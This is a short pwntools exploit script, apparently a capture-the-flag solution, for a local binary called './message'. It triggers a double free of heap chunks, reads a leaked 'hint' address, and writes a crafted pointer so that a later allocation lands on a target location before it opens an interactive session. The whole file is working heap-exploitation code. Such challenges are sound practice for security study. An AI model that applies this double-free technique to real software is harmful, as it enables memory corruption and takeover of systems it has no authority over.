from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./message"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter(">>",str(idx))

def add(mes):
    opt(1)
    p.sendlineafter("input message:\n",str(mes))

def free(idx):
    opt(2)
    p.sendlineafter("input the index to delete:\n",str(idx))

add("aaaa")
add("bbbb")
free(0)
free(1)
free(0)
opt(4)
p.recvuntil("hint:")
addr = p.recvuntil("\n",drop=True)
log.success(addr)
add(p64(int(addr,16)-0x10))
add("first")
add("second")
add("yes!")
opt(3)

p.interactive()
